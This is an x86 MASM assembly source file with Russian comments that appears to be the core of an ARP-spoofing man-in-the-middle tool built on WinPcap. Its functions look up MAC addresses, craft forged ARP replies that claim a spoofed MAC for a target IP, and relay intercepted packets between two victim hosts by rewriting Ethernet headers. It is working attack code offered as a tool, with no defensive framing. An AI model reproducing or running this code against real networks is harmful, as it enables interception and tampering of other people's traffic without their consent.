.code
;===================================================================
;===================================================================
;===================================================================
; Функция show_error(param)
; Вход - param - указатель на строку для вывода
; Выход - форматированный вывод ошибки
;
show_error  proc param:DWORD
	invoke	StdOut, addr crlf 
	invoke	wsprintf,addr buff, addr szerror_template,param
	invoke	StdOut, addr buff  
	invoke	StdOut, addr crlf  
	ret
show_error  endp

;===================================================================
;===================================================================
;===================================================================
; Функция show_help
; Вход - NULL 
; Выход - вывод инфо. об использовании проги
;
show_help  proc 
	invoke	StdOut, addr crlf 
	invoke	StdOut, addr szhelper
	invoke	StdOut, addr szhelper1	
	invoke	StdOut, addr crlf  
	ret
show_help endp
;===================================================================
;===================================================================
;===================================================================
.const
	MAXLEN_PHYSADDR	equ 8
.data
align 4

MIB_IPFORWARDROW	struct 
	dwForwardDest	DWORD 0
	dwForwardMask	DWORD 0
	dwForwardPolicy	DWORD 0
	dwForwardNextHop	DWORD 0
	dwForwardIfIndex	DWORD 0
	dwForwardType	DWORD 0
	dwForwardProto	DWORD 0
	dwForwardAge	DWORD 0
	dwForwardNextHopAS	DWORD 0
	dwForwardMetric1	DWORD 0
	dwForwardMetric2	DWORD 0
	dwForwardMetric3	DWORD 0
	dwForwardMetric4	DWORD 0
	dwForwardMetric5	DWORD 0
MIB_IPFORWARDROW	ends

MIB_IPNETROW	struct
	dwIndex		DWORD 0
	dwPhysAddrLen	DWORD 0
	bPhysAddr		BYTE MAXLEN_PHYSADDR DUP(0)
	dwAddr		DWORD 0
	dwType		DWORD 0
MIB_IPNETROW	ends
.code
;===================================================================
;===================================================================
;===================================================================
; Функция StaticARP (param1,param2)
; Вход -  param1 - указатель на IP адрес хоста
;	param2 - указатель на строку из 6 байт = MAC адресу хоста с IP=param1 выше
; Выход - Устанавливается локальное соответствие IP - MAC
; Результат виден по комманде - "C:\arp -a" 
;
;
StaticARP  proc uses esi szIPAddr:DWORD, bPhysAddr:DWORD 
local ipfrow 	 :MIB_IPFORWARDROW
local iprow 	 :MIB_IPNETROW 
local dwIPAddr 	 :DWORD
	
	invoke	inet_addr, szIPAddr
	mov	dwIPAddr,eax
	lea	edi,ipfrow
	invoke	GetBestRoute, eax, INADDR_ANY, edi
	.if	eax != NO_ERROR
		ret -1
	.endif

	invoke	memset, addr iprow,0,sizeof iprow
	assume	esi:ptr MIB_IPFORWARDROW
	assume	edi:ptr MIB_IPNETROW
	lea	esi,ipfrow
	lea	edi,iprow
	push	[esi].dwForwardIfIndex
	pop	[edi].dwIndex
	mov	[edi].dwPhysAddrLen, 6

	push	6
	mov	eax,bPhysAddr
	push	eax
	lea	eax,[edi].bPhysAddr
	push	eax
	call	memcpy

	mov	eax, dwIPAddr	
	mov	[edi].dwAddr, eax
	mov	[edi].dwType, 4;	/* - static */

	invoke	CreateIpNetEntry, edi
	.if	eax!= NO_ERROR
		xor	eax,eax
		ret
	.endif
	mov	eax,-1
	ret


StaticARP  endp
;===================================================================
;===================================================================
;===================================================================
; Функция GetMAC (param1, param2)
; Вход -  param1 - указатель на IP адрес хоста
;	param2 - указатель на строку из 6 байт куда будет помещена строка из 6-ти байт
; Выход - Строка из 6 байт = MAC адресу по адресу param2
; 
;
GetMAC  proc uses edx szIPaddr:DWORD, ucMacAddr:DWORD 
local dwIpaddr:	DWORD
local ulLen:	DWORD

	invoke	inet_addr, szIPaddr
	mov	dwIpaddr, eax
	mov	ulLen, 6
	invoke	SendARP, dwIpaddr, 0, ucMacAddr, addr ulLen
	.if eax == NO_ERROR
		xor	eax,eax
		ret
	.else
		mov	eax,-1
		ret
	.endif

	ret
GetMAC  endp
;===================================================================
;===================================================================
;===================================================================
; Функция Print_MAC (param1)
; Вход -  param1 - указатель на строку -6 байт МАС адреса 
;	
; Выход - Отображение на экране строки с MAC адресом
; 
;
Print_MAC proc param1:DWORD
local	locbuff[256]:BYTE

jmp	_go
	szMacloc	db '%02X-%02X-%02X-%02X-%02X-%02X',0
	tab2	db '	',0
_go:

	mov	edx,param1	
	movzx   eax, byte ptr [edx+5]
	push    eax
	movzx   eax, byte ptr [edx+4]
	push    eax
	movzx   eax, byte ptr [edx+3]
	push    eax
	movzx   eax, byte ptr [edx+2]
	push    eax
	movzx   eax, byte ptr [edx+1]
	push    eax
	movzx   eax, byte ptr [edx+0]
	push    eax
	invoke	wsprintf, addr locbuff, addr szMacloc
	add	esp, 4*6
	invoke	StdOut, addr locbuff
	invoke	StdOut, addr tab2 	
	ret
Print_MAC endp
;===================================================================
;===================================================================
;===================================================================
; Функция GetLocalIP (param1)
; Вход -  param1 - указатель на строку в которую будет скопирован 
;                  найденный, локальный, IP адрес 
; Выход - IP адрес с строке по адресу param1
; 
;
GetLocalIP proc pStr:DWORD

	invoke	pcap_findalldevs,addr alldevs,addr errbuf
	add	esp, 4*2
	.if (eax == -1)
		invoke	StdOut, addr szErrpcap_findalldevs							
	.endif

	mov	eax,0
	assume	ecx:ptr pcap_if
	mov	ecx,alldevs
	assume	edx:ptr pcap_if
	mov	edx,alldevs

	.while	(eax != DevSelection)
		assume	edx:ptr pcap_if
		lea	edx,[ecx].next 
		mov	ecx,edx	
		inc	eax
	.endw


	mov	ecx,edx
	mov	edx, (pcap_if  ptr [ecx]).address
	mov	eax, edx
	mov	ecx, (pcap_addr_t ptr [edx+4]); .address
	mov	edx, (sockaddr_in  ptr [ecx]).sin_addr
	mov	ecx,edx
	invoke    inet_ntoa,edx
	mov	esi,eax
	
	mov	edi,pStr
	mov	ecx,16
	rep	movsb
__exit_open:
	ret
GetLocalIP endp
;===================================================================
;===================================================================
;===================================================================
; Функция GetLocalMAC (param1,param2)
; Вход -  param1 - хендл открытого адаптера
; 	param2 - указатель на строку в которую будет скопирован MAC адрес
; Выход - MAC адрес с строке по адресу param2
; 
;
GetLocalMAC  proc ha:DWORD, pStr:DWORD
local pOidData: PACKET_OID_DATA
local pAddr[sizeof(PACKET_OID_DATA)+5]: BYTE

	invoke	RtlZeroMemory, addr pAddr,sizeof(PACKET_OID_DATA)+5
	assume	esi:ptr PACKET_OID_DATA
	lea	esi,pAddr
	mov	dword ptr [esi].Oid, OID_802_3_CURRENT_ADDRESS
	mov	dword ptr [esi].Lengthz,6
	mov	eax, ha

	invoke	PacketRequest,  dword ptr [eax], 0, esi
	add	esp,4*3

	lea	esi,pAddr
	add	esi,8

	mov	edi,pStr
	mov	ecx,6
	rep	movsb

	ret
GetLocalMAC endp
;===================================================================
;===================================================================
;===================================================================
.data
; Structures --
	arphdr struct
		arp_hwtype WORD ?
		arp_ptype  WORD ?
		arp_hwlen  BYTE ? 
		arp_plen   BYTE ?
		arp_opcode WORD ?
		arp_hwsource db 6 dup (?)
		arp_psource DWORD ?
		arp_hwdest   db 6 dup (?)
		arp_pdest	DWORD ?
	arphdr ends

	ether struct
		eth_dest db 6 dup (?)    
		eth_src  db 6 dup (?)    
		eth_type WORD ?
	ether ends


	iphedr struct 
		ver_ihl		db ?  ; version / siz
		tos		db ? ; type of service 
		tlen		dw ? ; total length 
		identification	dw ? ; identification 
		flags_fo		dw ? ; fragment offset field  
		ttl		db ? ; time to live 
		proto_		db ? ; protocol 
		crc		dw ? ; checksum 
		saddr		db 4 dup (?) ; source  address
		daddr		db 4 dup (?) ; dest address 
	iphedr ends

	tcphdr struct
		sourcePort	WORD ?
		destinationPort	WORD ?
		sequenceNumber	DWORD ?	
		acknowledgeNumber	DWORD ?	
		dataoffset	BYTE ?
		flags		BYTE ?
		windows		WORD ?
		checksum		WORD ?
		urgentPointer	WORD ?
	tcphdr ends
.const
	Size_	equ (Sizeof ether+Sizeof arphdr)
	ETHSIZE	equ (sizeof ether)
	ARPSIZE	equ (sizeof arphdr)

	ETHERTYPE_ARP	equ  806h
	ARPHRD_ETHER	equ  1	; /* Ethernet 10/100Mbps.*/
	ETHERTYPE_IP	equ  800h	; /* IP */
	ETHERLEN		equ  6
	PROTOLEN		equ  4
	ARPOP_REQUEST	equ  2	; /* 1-ARP request. 2-ARP reply.*/
	PCAP_ERRBUF_SIZE	equ 256
.code
;===================================================================
;===================================================================
;===================================================================
; Функция SendingARP (param1)
; Вход -  param1 - указатель на структуру ARPSPOOF 
; 
; Выход - отосланный ARP-пакет
; 
;
SendingARP proc harpspoof:DWORD  
local pBuffer:DWORD

	invoke	VirtualAlloc,0,Size_,MEM_COMMIT,PAGE_READWRITE
	mov	[pBuffer],eax
	assume	esi:ptr ARPSPOOF
	mov	esi,harpspoof

	mov	edi,eax
	lea	edi,(ether ptr [edi]).eth_dest
	lea	esi,(ARPSPOOF ptr [esi]).ucTargetMAC	;Dst_Mac
	mov	ecx,ETHERLEN
	rep	movsb

	mov	edi,[pBuffer]
	mov	esi,harpspoof

	lea	edi,(ether ptr [edi]).eth_src
	lea	esi,(ARPSPOOF ptr [esi]).ucSelfMAC	;Src_Mac
	mov	ecx,ETHERLEN
	rep	movsb

	mov	edi,[pBuffer]
	invoke	htons,ETHERTYPE_ARP
	mov	(ether ptr [edi]).eth_type,ax
	
	mov	edi,[pBuffer]
	add	edi,ETHSIZE
	assume	edi:ptr arphdr
	
	invoke	htons,ARPHRD_ETHER
	mov	[edi].arp_hwtype,ax
	
	invoke	htons,ETHERTYPE_IP
	mov	[edi].arp_ptype,ax
	
	mov	[edi].arp_hwlen,ETHERLEN
	mov	[edi].arp_plen,PROTOLEN
	
	invoke	htons,ARPOP_REQUEST
	mov	[edi].arp_opcode,ax

	mov	esi,harpspoof
	lea	ecx,(ARPSPOOF ptr [esi]).szTarget

	invoke	inet_addr,ecx			;_DstIP
	mov	[edi].arp_pdest,eax

	mov	esi,harpspoof
	lea	ecx,(ARPSPOOF ptr [esi]).szIP

	invoke	inet_addr,ecx			;_SrcIP
	mov	[edi].arp_psource,eax

	mov	esi,harpspoof
	lea	edi,[edi].arp_hwsource
	mov	ecx,ETHERLEN
	lea	esi,(ARPSPOOF ptr [esi]).ucPretendMAC	;Src_Mac
	rep	movsb
	

	mov	esi,harpspoof
	mov	edi,[pBuffer]
	add	edi,ETHSIZE
	lea	edi,[edi].arp_hwdest
	lea	esi,(ARPSPOOF ptr [esi]).ucTargetMAC	;Dst_Mac
	mov	ecx,ETHERLEN
	rep	movsb
	assume	edi:nothing
	

	mov	esi,harpspoof
	push	Size_
	push	[pBuffer]

	mov	eax,(ARPSPOOF ptr [esi]).hInterface
	push	eax
	call	pcap_sendpacket
	add	esp,4*3
	test	eax,eax
	jnz	Error_
Error_:	
	invoke	VirtualFree, [pBuffer],Size_,MEM_COMMIT 
		assume	esi:nothing
	ret
SendingARP  endp
;===================================================================
;===================================================================
;===================================================================
; Функция CtrlHandler (param1)
; Вход -  param1 - тип сообщения пользователя 
; 
; Выход - завершение программы
; 
;
CtrlHandler proc fdwCtrlType:DWORD 

	cmp dword ptr fdwCtrlType,CTRL_C_EVENT 
	je _reset
	cmp dword ptr fdwCtrlType,CTRL_CLOSE_EVENT
	je _reset
	cmp dword ptr fdwCtrlType,CTRL_BREAK_EVENT
	je _reset
	cmp dword ptr fdwCtrlType,CTRL_LOGOFF_EVENT
	je _reset
	cmp dword ptr fdwCtrlType,CTRL_SHUTDOWN_EVENT
	je _reset
	leave         
	jmp _default	; обработка по умолчанию      
_reset:	invoke	ResetSpoof
	xor	eax,eax

	invoke	ExitProcess,0
	;ret
_default:	xor	eax,eax
	mov	eax,-1
	invoke	ExitProcess,0
	;ret
CtrlHandler	endp
;===================================================================
;===================================================================
;===================================================================
; Функция packet_handler (param1,param2,param3)
; Вход -  param1 - хидер открытого адаптера
;	param2 - указатель на начало полученного пакета	
;	param3 - длина полученного пакета
; 
; Выход - передача управления на ForwardPacket()
; 
;
;void user_routine (u_char *user, struct pcap_pkthdr *phrd, u_char *pdata)
;Пользовательский параметр который передается в pcap_dispatch подпрограмму. 
;Параметр, phdr, является указателем на pcap_pkthdr структуру, которая предшествует каждому пакету. 
;Параметр, pdata, указывает на данные пакета. Это позволяет пользователям определять собственную 
;обработку фильтрованных пакетов.
packet_handler proc param:DWORD, hdr:ptr pcap_pkthdr , pcktdata:ptr byte
	mov	esi,hdr
	mov	eax,(pcap_pkthdr ptr [esi]).len
	push	eax
	push	pcktdata
	push	adhandle
	call	ForwardPacket
	add	esp, 12	
	ret	0
packet_handler	endp

;===================================================================
;===================================================================
;===================================================================
; Функция ForwardPacket (param1,param2,param3)
; Вход -  param1 - хидер открытого адаптера
;	param2 - указатель на начало полученного пакета	
;	param3 - длина полученного пакета
; 
; Выход - перестроить и отослать пакет
; 
;
.data
	sztempl		db "%d.%d.%d.%d",0
	szSendError	db "[-] Forward thread send packet error",13,10,0
.code
ForwardPacket proc uses esi adhead:DWORD, pktdata:ptr byte, len_pack:DWORD
local eh:ether
local ih:iphedr
local th:tcphdr
local ip_len:DWORD
local szSource[16]:BYTE
local szDest[16]:BYTE

	mov	eax,dwTimeWait
	.if	dwTimeWait!=0
		invoke	 Sleep, dwTimeWait
	.endif


	; Получаем указатель на Ethernet-заголовок пакета
	mov	eax, DWORD PTR pktdata
	mov	DWORD PTR eh, eax
	; Проверим валидность полученного пакета
	; eh->type == htons(ETHERTYPE_IP)?
	; Если нет то выход
	mov	ecx, DWORD PTR eh
	xor	edx, edx
	mov	dx, WORD PTR [ecx+12]
	mov	esi, edx
	push	2048	; =800h
	call	htons
	and	eax, 65535
	cmp	esi, eax
	je	__ok
	jmp	__quit

	; Получим указатель на IP заголовок
	; ih=pktdata+14
	; где, pktdata - указатель на начало полученного пакета
	;      14 - длина Ethernet-заголовка пакета, структура ether
__ok:	mov	eax, DWORD PTR pktdata
	add	eax, 14
	mov	DWORD PTR ih, eax

	; Получаем длину IP заголовка ip_len= (ih->iphVerLen & 0xf) * 4
	mov	ecx, DWORD PTR ih
	xor	edx, edx
	mov	dl, BYTE PTR [ecx]
	and	edx, 15
	shl	edx, 2
	mov	DWORD PTR ip_len, edx

	; Перейдем по пакету на структуру tcphedr = ipheadr+ip_len
	mov	eax, DWORD PTR ih
	add	eax, DWORD PTR ip_len
	mov	DWORD PTR th, eax

	; Получим строку с IP отправителя

	mov	edx, DWORD PTR ih
	xor	eax, eax
	mov	al, BYTE PTR [edx+15]
	push	eax
	mov	ecx, DWORD PTR ih
	xor	edx, edx
	mov	dl, BYTE PTR [ecx+14]
	push	edx
	mov	eax, DWORD PTR ih
	xor	ecx, ecx
	mov	cl, BYTE PTR [eax+13]
	push	ecx
	mov	edx, DWORD PTR ih
	xor	eax, eax
	mov	al, BYTE PTR [edx+12]
	push	eax
	push	offset sztempl
	lea	ecx, szSource
	push	ecx
	call	wsprintfA
	add	esp, 24

	; Получим строку с IP приемника 
	mov	edx, DWORD PTR ih
	xor	eax, eax
	mov	al, BYTE PTR [edx+19]
	mov	esi, esp
	push	eax
	mov	ecx, DWORD PTR ih
	xor	edx, edx
	mov	dl, BYTE PTR [ecx+18]
	push	edx
	mov	eax, DWORD PTR ih
	xor	ecx, ecx
	mov	cl, BYTE PTR [eax+17]
	push	ecx
	mov	edx, DWORD PTR ih
	xor	eax, eax
	mov	al, BYTE PTR [edx+16]
	push	eax
	push	offset sztempl
	lea	ecx, szDest
	push	ecx
	call	wsprintfA
	add	esp, 24



	; Сравним у пришедшего пакета IP приемника == Моему локальному IP
	; szDest == szSelfIP?
	; Если нет выход
	lea	esi,arpspoof
	lea	eax,(ARPSPOOF ptr [esi]).szSelfIP
	push	eax 
	lea	edx, szDest
	push	edx
	call	strcmp
	add	esp, 8
	test	eax, eax
	je	__quit

	; Сравним у пришедшего пакета (Локальный MAC) ucSelfMAC == eh->dhost?
	; Если нет выход
	push	6
	mov	eax, DWORD PTR eh
	push	eax
	lea	eax,(ARPSPOOF ptr [esi]).ucSelfMAC	; Локальный MAC
	push	eax 
	call	memcmp
	add	esp, 12
	test	eax, eax
	jne	__quit

	; Работаем с пакетом IP-A -> IP-B
	; Сравним из полученного пакета eh->shost с MAC IP-A
	push	6
	lea	eax,(ARPSPOOF ptr [esi]).ucIPMAC	; MAC IP-A
	push	eax 
	mov	ecx, DWORD PTR eh
	add	ecx, 6
	push	ecx
	call	memcmp
	add	esp, 12
	test	eax, eax
	jne	__may_be_BA

	; Копируем в eh->shost  eh->dhost
	push	6
	mov	edx, DWORD PTR eh
	push	edx
	mov	eax, DWORD PTR eh
	add	eax, 6
	push	eax
	call	memcpy
	add	esp, 12


	; Копируем в eh->dhost  MAC IP-B
	lea	esi,arpspoof
	push	6
	lea	eax,(ARPSPOOF ptr [esi]).ucTargetMAC	; MAC IP-B
	push	eax
	mov	ecx, DWORD PTR eh
	push	ecx
	call	memcpy
	add	esp, 12

	; Отсылаем пакет  IP-А -> IP-В
	mov	edx, DWORD PTR len_pack
	push	edx
	mov	eax, DWORD PTR pktdata
	push	eax
	mov	ecx, DWORD PTR adhandle
	push	ecx
	call	pcap_sendpacket
	add	esp, 12
	test	eax, eax
	jge	__AB_send_ok
	invoke	StdOut, addr szSendError
__AB_send_ok:
	jmp	__quit

	; Работаем с пакетом IP-B -> IP-A
	; Сравним из полученного пакета eh->shost с MAC IP-B
__may_be_BA:

	lea	esi,arpspoof
	push	6
	lea	eax,(ARPSPOOF ptr [esi]).ucTargetMAC ; MAC IP-B
	push	eax
	mov	edx, DWORD PTR eh
	add	edx, 6
	push	edx
	call	memcmp
	add	esp, 12
	test	eax, eax
	jne	__quit

	; Копируем в eh->shost  eh->dhost
	push	6
	mov	eax, DWORD PTR eh
	push	eax
	mov	ecx, DWORD PTR eh
	add	ecx, 6
	push	ecx
	call	memcpy
	add	esp, 12

	; Копируем в eh->dhost  MAC IP-A
lea	esi,arpspoof
	push	6
	
	lea	eax,(ARPSPOOF ptr [esi]).ucIPMAC	; MAC IP-A
	push	eax
	mov	edx, DWORD PTR eh
	push	edx
	call	memcpy
	add	esp, 12

	mov	eax, DWORD PTR len_pack
	push	eax
	mov	ecx, DWORD PTR pktdata
	push	ecx
	mov	edx, DWORD PTR adhead
	push	edx
	call	pcap_sendpacket
	add	esp, 12
	test	eax, eax
	jge	__quit
	invoke	StdOut, addr szSendError
__quit:	ret	0
ForwardPacket	endp

